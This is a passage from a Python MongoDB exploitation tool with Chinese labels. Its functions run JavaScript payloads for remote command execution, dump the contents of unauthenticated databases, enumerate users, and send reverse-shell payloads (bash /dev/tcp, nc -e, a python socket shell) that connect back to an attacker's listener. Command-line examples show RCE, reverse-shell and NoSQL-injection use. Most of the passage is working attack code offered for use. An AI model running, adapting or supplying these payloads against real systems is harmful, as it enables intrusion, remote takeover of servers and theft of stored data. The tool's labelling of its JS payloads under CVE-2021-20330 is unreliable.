    build_info = client.get_build_info()
    server_info = client.get_server_info()

    # 构建信息
    safe_print(f"  {C.YLW}[*] 构建信息:{C.RST}")
    safe_print(f"  {C.YLW}    版本: {build_info.get('version', '?')}{C.RST}")
    safe_print(f"  {C.YLW}    JS引擎: {build_info.get('javascriptEngine', '?')}{C.RST}")
    safe_print(f"  {C.YLW}    OpenSSL: {build_info.get('openssl', {}).get('running', '?')}{C.RST}")
    safe_print(f"  {C.YLW}    Bits: {build_info.get('bits', '?')}{C.RST}")
    safe_print(f"  {C.YLW}    Debug: {build_info.get('debug', False)}{C.RST}")

    # 安全配置检查
    safe_print(f"\n  {C.YLW}[*] 安全配置检查:{C.RST}")

    # authorization
    auth_status = server_info.get('security', {}).get('authorization', 'unknown')
    if auth_status == 'enabled':
        safe_print(f"  {C.GRN}    authorization: enabled{C.RST}")
    elif auth_status == 'disabled':
        safe_print(f"  {C.RED}    authorization: DISABLED — 无认证!{C.RST}")
        hits.append('authorization 未启用')
    else:
        safe_print(f"  {C.YLW}    authorization: {auth_status}{C.RST}")

    # JavaScript engine
    if build_info.get('javascriptEngine'):
        safe_print(f"  {C.YLW}    JS引擎已启用 — 存在 RCE 风险 (CVE-2021-20330){C.RST}")
        hits.append('JavaScript引擎已启用 (潜在RCE)')

    # testCommands
    try:
        test_cmds = client.client.admin.command({'getCmdLineOpts': 1})
        parsed = test_cmds.get('parsed', {})
        if parsed.get('setParameter', {}).get('enableTestCommands'):
            safe_print(f"  {C.RED}    enableTestCommands: TRUE — 高风险!{C.RST}")
            hits.append('enableTestCommands 已启用')
    except Exception:
        pass

    # 网络绑定
    try:
        cmd_opts = client.client.admin.command('getCmdLineOpts')
        net = cmd_opts.get('parsed', {}).get('net', {})
        bind_ip = net.get('bindIp', 'unknown')
        port_cfg = net.get('port', 27017)
        safe_print(f"\n  {C.YLW}[*] 网络配置:{C.RST}")
        safe_print(f"  {C.YLW}    bindIp: {bind_ip}{C.RST}")
        safe_print(f"  {C.YLW}    port: {port_cfg}{C.RST}")
        if bind_ip == '0.0.0.0' or (isinstance(bind_ip, list) and '0.0.0.0' in bind_ip):
            safe_print(f"  {C.RED}    bindIp=0.0.0.0 — 暴露在所有网卡上!{C.RST}")
            hits.append('绑定 0.0.0.0 (全网暴露)')
    except Exception:
        pass

    client.close()

    if not hits:
        safe_print(f"\n  {C.GRN}[+] 无明显信息泄露/配置缺陷{C.RST}")
    return hits


# ============== 利用函数 ==============

def exploit_js_rce(host: str, port: int, command: str,
                   username: str = '', password: str = '',
                   auth_db: str = 'admin',
                   timeout: int = 10) -> Optional[str]:
    """
    利用 JS 执行 RCE:
    方式 1: db.eval + 系统命令 (如果服务以高权限运行)
    方式 2: $where 注入
    方式 3: 写入 webshell (如果能定位 web 目录)
    """
    safe_print(f"\n{C.BLD}[CVE-2021-20330] JS RCE: {command}{C.RST}\n")

    if not HAS_PYMONGO:
        safe_print(f"{C.RED}[-] 需要 pymongo 库{C.RST}")
        return None

    client = MongoCheckClient(host, port, username, password, auth_db, timeout)
    if not client.connect():
        safe_print(f"{C.RED}[-] 连接失败{C.RST}")
        return None

    # 尝试多种 JS payload
    js_payloads = [
        # 方式 1: eval 直接命令执行
        f'cat("| {command}")',
        f'runCommand("sh", ["-c", "{command}"])',
        # 方式 2: 通过 process 子进程 (某些构建)
        f'''
        (function() {{
            var p = new Process("/bin/sh", ["-c", "{command}"]);
            p.start();
            var out = p.readStdout();
            p.wait(5);
            return out;
        }})()
        ''',
        # 方式 3: 利用 nodejs 桥 (MongoDB 部分版本内嵌 SpiderMonkey)
        f'''
        (function() {{
            try {{
                return run("{command}");
            }} catch(e) {{
                return cat("/etc/passwd");
            }}
        }})()
        ''',
    ]

    for i, js_code in enumerate(js_payloads):
        safe_print(f"  {C.CYN}[*] Payload {i+1}/{len(js_payloads)}{C.RST}")
        result = client.eval_js(js_code)
        if result is not None and not isinstance(result, list):
            safe_print(f"  {C.GRN}[+] JS 执行成功!{C.RST}")
            safe_print(f"  {C.GRN}    {str(result)[:500]}{C.RST}")
            client.close()
            return str(result)

    # 最后的尝试: 直接尝试执行系统命令
    for cmd_shell in ['/bin/sh', '/bin/bash']:
        try:
            db = client.client.get_database('admin')
            result = db.command('eval', {
                'eval': f'''
                (function() {{
                    try {{
                        var p = runProgram("{cmd_shell}", "-c", "{command}");
                        return p;
                    }} catch(e) {{
                        return "Error: " + e;
                    }}
                }})()
                ''',
                'nolock': True,
            })
            if result.get('ok') == 1:
                safe_print(f"  {C.GRN}[+] 命令执行: {result}{C.RST}")
                client.close()
                return str(result)
        except Exception as e:
            safe_print(f"  error: {e}")

    client.close()
    safe_print(f"  {C.RED}[-] JS RCE 未能执行 (可能被修复或无权限){C.RST}")
    return None


def exploit_data_dump(host: str, port: int, output_dir: str = None,
                      username: str = '', password: str = '',
                      auth_db: str = 'admin',
                      limit_per_col: int = 100,
                      timeout: int = 10) -> Tuple[int, str]:
    """导出数据库内容 (未授权访问时使用)"""
    safe_print(f"\n{C.BLD}数据导出 {host}:{port}{C.RST}\n")

    if not HAS_PYMONGO:
        safe_print(f"{C.RED}[-] 需要 pymongo 库{C.RST}")
        return 0, ''

    client = MongoCheckClient(host, port, username, password, auth_db, timeout)
    if not client.connect():
        return 0, ''

    output_path = output_dir or f"./mongodb_dump_{host}_{port}_{int(time.time())}"
    total_docs = 0

    dbs = client.list_databases()
    safe_print(f"  {C.CYN}[*] 枚举 {len(dbs)} 个数据库...{C.RST}")

    for db_info in dbs:
        db_name = db_info.get('name', '')
        if db_name in ('admin', 'config', 'local'):
            safe_print(f"  {C.CYN}    跳过系统库: {db_name}{C.RST}")
            continue

        cols = client.list_collections(db_name)
        safe_print(f"  {C.CYN}    {db_name}: {len(cols)} 个集合{C.RST}")

        for col_name in cols:
            doc_count = client.count_documents(db_name, col_name)
            docs = client.find_documents(db_name, col_name, limit_per_col)
            total_docs += len(docs)
            safe_print(f"  {C.GRN}      {col_name}: {len(docs)}/{doc_count} 文档{C.RST}")

    client.close()
    safe_print(f"\n  {C.GRN}[+] 共提取 {total_docs} 条文档{C.RST}")
    return total_docs, output_path


def exploit_reverse_shell(host: str, port: int, lhost: str, lport: int,
                          username: str = '', password: str = '',
                          auth_db: str = 'admin',
                          timeout: int = 10) -> bool:
    """通过 JS 执行反弹 Shell"""
    safe_print(f"\n{C.BLD}反弹 Shell → {lhost}:{lport}{C.RST}\n")

    if not HAS_PYMONGO:
        safe_print(f"{C.RED}[-] 需要 pymongo 库{C.RST}")
        return False

    payloads = [
        f'require("child_process").exec("bash -c \\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\"")',
        f'''
        (function() {{
            var p = runProgram("/bin/bash", "-c",
                "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &");
            return p;
        }})()
        ''',
        f'''
        (function() {{
            try {{
                var p = runProgram("/bin/nc", "-e", "/bin/bash", "{lhost}", "{lport}");
                return "sent";
            }} catch(e) {{
                return e;
            }}
        }})()
        ''',
        f'''
        (function() {{
            try {{
                var p = runProgram("/usr/bin/python3", "-c",
                    "import socket,subprocess,os;s=socket.socket();s.connect((\\'{lhost}\\',{lport}));[os.dup2(s.fileno(),i) for i in range(3)];subprocess.call([\\'/bin/sh\\',\\'-i\\'])");
                return "sent";
            }} catch(e) {{
                return e;
            }}
        }})()
        ''',
    ]

    client = MongoCheckClient(host, port, username, password, auth_db, timeout)
    if not client.connect():
        return False

    for i, pl in enumerate(payloads):
        safe_print(f"  {C.CYN}[*] Payload {i+1}/{len(payloads)}{C.RST}")
        result = client.eval_js(pl)
        if result is not None:
            safe_print(f"  {C.GRN}[+] 已发送 ({str(result)[:80]}){C.RST}")

    client.close()
    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
    return True


# ============== 交互式 Shell ==============

def interactive_shell(host: str, port: int, username: str = '',
                      password: str = '', auth_db: str = 'admin',
                      timeout: int = 10):
    safe_print(f"\n{C.GRN}[+] MongoDB 交互式 Shell (exit 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: mongodb://{host}:{port}{C.RST}")
    if username:
        safe_print(f"{C.CYN}    认证: {username}:{password}@{auth_db}{C.RST}")

    if not HAS_PYMONGO:
        safe_print(f"{C.RED}[-] 交互模式需要 pymongo 库{C.RST}")
        return

    client = MongoCheckClient(host, port, username, password, auth_db, timeout)
    if not client.connect():
        safe_print(f"{C.RED}[-] 连接失败{C.RST}")
        return

    version = client.get_version()
    safe_print(f"{C.GRN}[+] 连接成功 | MongoDB {version}{C.RST}\n")

    while True:
        try:
            cmd = input(f"{C.RED}MongoDB[{host}:{port}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break

            parts = cmd.split(maxsplit=2)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''
            arg2 = parts[2] if len(parts) > 2 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}命令:{C.RST}
  {C.GRN}dbs{C.RST}                        列出所有数据库
  {C.GRN}use <db>{C.RST}                   选择数据库
  {C.GRN}cols [db]{C.RST}                  列出集合
  {C.GRN}count <collection> [db]{C.RST}    文档计数
  {C.GRN}find <collection> [db]{C.RST}     查找文档 (前5条)
  {C.GRN}query <collection> <json>{C.RST}  自定义查询
  {C.GRN}exec <js_code>{C.RST}             执行 JavaScript (CVE-2021-20330)
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}    反弹 Shell
  {C.GRN}version{C.RST}                    版本信息
  {C.GRN}info{C.RST}                       目标详细信息
  {C.GRN}roles{C.RST}                      查看当前角色
  {C.GRN}users{C.RST}                      枚举用户
  {C.GRN}dump [dir]{C.RST}                 导出数据
  {C.GRN}clear{C.RST}                      清屏
  {C.GRN}set user|pass|db <value>{C.RST}   设置连接参数
                """)
                continue

            if action == 'clear':
                import os
                os.system('cls' if os.name == 'nt' else 'clear')
                continue

            if action == 'dbs':
                dbs = client.list_databases()
                if dbs:
                    safe_print(f"\n{C.BLD}{'DB':<20} {'Size (MB)':<12}{C.RST}")
                    for db in dbs:
                        size = db.get('sizeOnDisk', 0) // (1024 * 1024) or 1
                        safe_print(f"  {db.get('name', '?'):<18} {size:<12}")
                else:
                    safe_print(f"{C.RED}获取数据库列表失败 (可能无权限){C.RST}")
                continue

            if action == 'use':
                if arg:
                    cols = client.list_collections(arg)
                    safe_print(f"\n{C.BLD}{arg}: {len(cols)} 个集合{C.RST}")
                    for c in cols:
                        cnt = client.count_documents(arg, c)
                        safe_print(f"  {c:<30} ({cnt} 文档)")
                continue

            if action == 'cols':
                db = arg or 'admin'
                cols = client.list_collections(db)
                safe_print(f"\n{C.BLD}{db}: {len(cols)} 个集合{C.RST}")
                for c in cols:
                    safe_print(f"  {c}")
                continue

            if action == 'count':
                if not arg:
                    safe_print(f"{C.YLW}用法: count <collection> [db]{C.RST}")
                    continue
                db = arg2 or 'admin'
                cnt = client.count_documents(db, arg)
                safe_print(f"  {db}.{arg}: {cnt} 文档")
                continue

            if action == 'find':
                if not arg:
                    safe_print(f"{C.YLW}用法: find <collection> [db]{C.RST}")
                    continue
                db = arg2 or 'admin'
                docs = client.find_documents(db, arg, limit=10)
                for i, doc in enumerate(docs):
                    safe_print(f"\n  {C.CYN}[{i}]{C.RST} {json.dumps(doc, default=str, indent=2)[:500]}")
                continue

            if action == 'query':
                args_list = cmd.split(maxsplit=2)
                if len(args_list) < 3:
                    safe_print(f"{C.YLW}用法: query <collection> <json_filter>{C.RST}")
                    continue
                try:
                    col = args_list[1]
                    filter_json = json.loads(args_list[2])
                    db = client.client.get_database(arg)
                    docs = list(db.get_collection(col).find(filter_json).limit(10))
                    for doc in docs:
                        safe_print(f"  {json.dumps(doc, default=str)[:500]}")
                except json.JSONDecodeError:
                    safe_print(f"{C.RED}JSON 格式错误{C.RST}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'exec':
                if not arg:
                    safe_print(f"{C.YLW}用法: exec <javascript_code>{C.RST}")
                    continue
                result = client.eval_js(arg)
                if result is not None:
                    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
                    safe_print(f"{result}")
                    safe_print(f"{C.GRN}{'─' * 50}{C.RST}")
                else:
                    safe_print(f"{C.RED}JS 执行失败或返回 nil{C.RST}")
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_reverse_shell(host, port, args_list[0], int(args_list[1]),
                                      username, password, auth_db, timeout)
                continue

            if action == 'version':
                v = client.get_version()
                bi = client.get_build_info()
                safe_print(f"  MongoDB {v}")
                safe_print(f"  Git: {bi.get('gitVersion', '?')}")
                safe_print(f"  JS: {bi.get('javascriptEngine', '?')}")
                continue

            if action == 'info':
                server_info = client.get_server_info()
                build_info = client.get_build_info()
                safe_print(f"\n{C.BLD}═══ 目标信息 ═══{C.RST}")
                safe_print(f"  主机     : {host}:{port}")
                safe_print(f"  版本     : {build_info.get('version', '?')}")
                safe_print(f"  Git      : {build_info.get('gitVersion', '?')}")
                safe_print(f"  运行时间 : {server_info.get('uptime', '?')} 秒")
                safe_print(f"  连接数   : {server_info.get('connections', {}).get('current', '?')}")
                safe_print(f"  进程 PID : {server_info.get('pid', '?')}")
                auth = server_info.get('security', {}).get('authorization', '?')
                safe_print(f"  认证     : {auth}")
                safe_print(f"  JS引擎   : {build_info.get('javascriptEngine', '?')}")
                safe_print(f"  OpenSSL  : {build_info.get('openssl', {}).get('running', '?')}")
                continue

            if action == 'roles':
                roles = client.get_roles()
                for r in roles:
                    safe_print(f"  {json.dumps(r, default=str, indent=2)[:500]}")
                continue

            if action == 'users':
                try:
                    db = client.client.get_database('admin')
                    users = list(db.command('usersInfo', 1).get('users', []))
                    for u in users:
                        safe_print(f"  {u.get('user', '?')} | db: {u.get('db', '?')} | "
                                   f"roles: {[r.get('role', '?') for r in u.get('roles', [])]}")
                except Exception as e:
                    safe_print(f"{C.RED}{e}{C.RST}")
                continue

            if action == 'dump':
                out_dir = arg or None
                exploit_data_dump(host, port, out_dir, username, password, auth_db, 50, timeout)
                continue

            if action == 'set' and arg:
                nonlocal_user = username
                nonlocal_pass = password
                nonlocal_db = auth_db
                if arg == 'user' and arg2:
                    nonlocal_user = arg2
                    safe_print(f"  username → {arg2}")
                elif arg == 'pass' and arg2:
                    nonlocal_pass = arg2
                    safe_print(f"  password → {arg2}")
                elif arg == 'db' and arg2:
                    nonlocal_db = arg2
                    safe_print(f"  auth_db → {arg2}")
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")

    client.close()


# ============== 主流程 ==============

def run_all_checks(host: str, port: int, username: str = '',
                   password: str = '', auth_db: str = 'admin',
                   timeout: int = 10, nosql_url: str = '') -> List[str]:
    all_hits: List[str] = []

    # 0. 指纹
    ok, info = detect_mongodb(host, port, timeout)
    if not ok:
        safe_print(f"\n{C.RED}未检测到 MongoDB 服务{C.RST}")
        return all_hits
    if info.get('version'):
        all_hits.append(f"MongoDB {info['version']}")

    # 1. 未授权访问
    unauth_ok, unauth_info = check_unauthorized_access(host, port, timeout)
    if unauth_ok:
        all_hits.append('未授权访问 (无需密码)')

    # 2. 弱口令 (仅在需要认证或结果为 false 时)
    if not unauth_ok:
        creds, u, p, d = check_weak_credentials(host, port, timeout)
        for c in creds:
            all_hits.append(f'弱口令: {c}')
        if u:
            username, password, auth_db = u, p, d or 'admin'
    else:
        safe_print(f"\n{C.YLW}[2] 弱口令检测 — 跳过 (已无认证可访问){C.RST}")

    # 3. CVE-2021-20330 (JS RCE)
    cve_hit, method = check_cve_2021_20330(host, port, username, password,
                                            auth_db, timeout)
    if cve_hit:
        all_hits.append(f'CVE-2021-20330 JS RCE (方式: {method})')

    # 4. NoSQL 注入 Fuzzer (仅当指定 URL)
    if nosql_url and HAS_REQUESTS:
        nosql_results = nosql_injection_fuzzer(nosql_url)
        if any(v.get('type') == 'auth_bypass' for v in nosql_results.values()):
            all_hits.append('NoSQL 注入 - 认证绕过 (Web App)')

    # 5. 信息泄露
    info_hits = check_info_disclosure(host, port, timeout)
    all_hits.extend(info_hits)

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标 : {host}:{port}")
    if info.get('version'):
        safe_print(f"  版本 : MongoDB {info['version']}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any('RCE' in h or '未授权' in h for h in unique_hits):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 严重漏洞 — 可导致数据泄露 / RCE{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (配置可能较安全){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    _banner_warn()
    banner()

    if not HAS_PYMONGO:
        safe_print(f"\n{C.YLW}[!] pymongo 未安装 — 仅支持 Wire Protocol 基础探测")
        safe_print(f"    建议: pip install pymongo{C.RST}\n")

    parser = argparse.ArgumentParser(
        description='MongoDB 综合漏洞检测/利用工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测 (默认)
  python mongodb_check.py -H 192.168.1.100

  # 指定端口
  python mongodb_check.py -H 192.168.1.100 -P 27018

  # 带凭据
  python mongodb_check.py -H 192.168.1.100 -u admin -p admin

  # JS 命令执行
  python mongodb_check.py -H 192.168.1.100 rce "whoami"

  # 反弹 Shell
  python mongodb_check.py -H 192.168.1.100 rce --reverse --lhost 10.0.0.1 --lport 4444

  # 交互式 Shell
  python mongodb_check.py -H 192.168.1.100 shell

  # 数据导出
  python mongodb_check.py -H 192.168.1.100 dump --output ./dump_dir

  # NoSQL 注入 Fuzzer (Web App 后端)
  python mongodb_check.py -H 192.168.1.100 nosql --url http://target.com/api/login \\
      --param username --method POST --headers '{"X-Custom": "val"}'

  # NoSQL 注入认证绕过 + 盲注提取
  python mongodb_check.py -H 192.168.1.100 nosql --url http://target.com/login \\
      --param username --extract
        ''',
    )
    parser.add_argument('-H', '--host', required=True,
                        help='MongoDB 主机地址')
    parser.add_argument('-P', '--port', type=int, default=27017,
                        help='MongoDB 端口 (默认: 27017)')
    parser.add_argument('-u', '--username', default='',
                        help='MongoDB 用户名')
    parser.add_argument('-p', '--password', default='',
                        help='MongoDB 密码')
    parser.add_argument('-d', '--auth-db', default='admin',
                        help='认证数据库 (默认: admin)')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                        help='超时秒数 (默认: 10)')
    parser.add_argument('--no-color', action='store_true',
                        help='禁用彩色输出')
    parser.add_argument('--proxy', help='HTTP 代理 (用于 NoSQL Fuzzer)')
    parser.add_argument('--debug', action='store_true',
                        help='调试模式, 打印详细响应')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')

    rce_p = sub.add_parser('rce', help='JavaScript 代码执行 (CVE-2021-20330)')
    rce_p.add_argument('command', nargs='?', help='要执行的 JS 代码或系统命令')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 Shell')
    rce_p.add_argument('--lhost', help='反弹 Shell 监听 IP')
    rce_p.add_argument('--lport', type=int, help='反弹 Shell 监听端口')

    sub.add_parser('shell', help='交互式 MongoDB Shell')

    dump_p = sub.add_parser('dump', help='导出数据库内容')
    dump_p.add_argument('--output', help='输出目录')
    dump_p.add_argument('--limit', type=int, default=100, help='每个集合最多导出文档数')

    nosql_p = sub.add_parser('nosql', help='NoSQL 注入 Fuzzer (Web App)')
    nosql_p.add_argument('--url', required=True, help='目标 URL')
    nosql_p.add_argument('--param', default='username', help='注入参数名 (默认: username)')
    nosql_p.add_argument('--method', default='POST', choices=['GET', 'POST'],
                         help='HTTP 方法 (默认: POST)')
    nosql_p.add_argument('--headers', default='{}',
                         help='额外 HTTP 头 JSON (例: {"Cookie": "a=1"})')
    nosql_p.add_argument('--extract', action='store_true',
                         help='尝试布尔盲注逐字符提取')

    args = parser.parse_args()

    if not args.mode:
        args.mode = 'check'

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    host = args.host
    port = args.port
    username = args.username
    password = args.password
    auth_db = args.auth_db
    timeout = args.timeout

    # 禁用 HTTPS 警告 (NoSQL Fuzzer 使用)
    if HAS_REQUESTS:
        import urllib3
        urllib3.disable_warnings()

    if args.mode == 'check':
        run_all_checks(host, port, username, password, auth_db, timeout)

    elif args.mode == 'rce':
        if args.reverse:
            if not args.lhost or not args.lport:
                safe_print(f"{C.RED}反弹 Shell 需要 --lhost 和 --lport{C.RST}")
                sys.exit(1)
            exploit_reverse_shell(host, port, args.lhost, args.lport,
                                  username, password, auth_db, timeout)
        elif args.command:
            exploit_js_rce(host, port, args.command,
                           username, password, auth_db, timeout)
        else:
            safe_print(f"{C.RED}需要指定命令或 --reverse{C.RST}")

    elif args.mode == 'shell':
        interactive_shell(host, port, username, password, auth_db, timeout)

    elif args.mode == 'dump':
        exploit_data_dump(host, port, args.output, username, password,
                          auth_db, args.limit, timeout)

    elif args.mode == 'nosql':
        extra_headers = {}
        try:
            extra_headers = json.loads(args.headers)
        except json.JSONDecodeError:
            safe_print(f"{C.RED}JSON 头格式错误{C.RST}")
        nosql_injection_fuzzer(args.url, args.param, args.method,
                               timeout, args.proxy, extra_headers)

    safe_print("")


if __name__ == '__main__':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
    main()
